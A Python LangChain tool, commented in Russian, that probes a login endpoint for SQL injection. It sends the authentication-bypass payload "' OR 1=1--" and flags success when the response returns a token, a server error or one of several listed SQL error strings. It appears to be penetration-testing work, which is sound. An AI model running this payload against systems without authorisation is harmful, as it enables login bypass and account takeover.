# SQL-инъекция
from langchain.tools import tool
import json
import re
import requests


@tool
def test_sqli_login(base_url: str,
                    endpoint: str = "/rest/user/login",
                    email_payload: str = "' OR 1=1--",
                    password_payload: str = "1234567890"):
    """
    проверяет форму логина на SQL-инъекцию и наличие признаков SQL-ошибок в ответе
   
    отправляет POST-запрос на точку входа с подозрительными значениями email и password
    ("'OR 1=1 --", "1234567890")
    если сервер возвращает токен аутентификации - признак успешной инъекции


    base_url - адрес ресурса
    endpoint - точка входа
    email_payload - SQL-payload для email
    password_payload - любое значение для пароля


    возвращает: статус, вердикт, тело    
    """


    # формирование запроса
    url = f"{base_url}{endpoint}"
    payload = {"email": email_payload,
               "password": password_payload}
    headers = {"Content-Type": "application/json"}


    try:
        res = requests.post(
            url,
            json=payload,
            headers=headers,
            timeout=10,
            allow_redirects=False
        )
    except requests.exceptions.Timeout:
        return "таймаут при запросе"
    except requests.exceptions.ConnectionError:
        return f"не удалось подключиться к {url}"
    except Exception as e:
        return f"ошибка запроса {e}"


    body = ((res.text or "")[:100]).lower()


    sign = [] # признаки успешной SQLi


    # =========== сервер вернул JWT ===========
    if (res.status_code == 200) and ("token" in body or "authentication" in body):
        sign.append("получен токен аутентификации")


    # =========== сервер вернул 500 ===========
    if res.status_code == 500: sign.append("внутренняя ошибка")


    # =========== есть признаки SQL-ошибки ===========
    sql_errors = [
        "sql syntax",
        "mysql_fetch",
        "sqlite3.",
        "postgresql",
        "ora-0",
        "unclosed quotation",
        "you have an error in your sql",
        "sequelize"
    ]


    # формирование вердикта
    errors = [e for e in sql_errors if e in body]
    if errors: sign.append(f"SQL-ошибки: {' '.join(errors)}")


    if sign:
        result = {
            "verdict": "уязвимо",
            "url": url,
            "payload": payload,
            "status": res.status_code,
            "sign": sign,
            "body": body
        }
    else:
        result = {
            "verdict": "ОК",
            "url": url,
            "payload": payload,
            "status": res.status_code,
            "body": body
        }


    return json.dumps(result, ensure_ascii=False, indent=2)
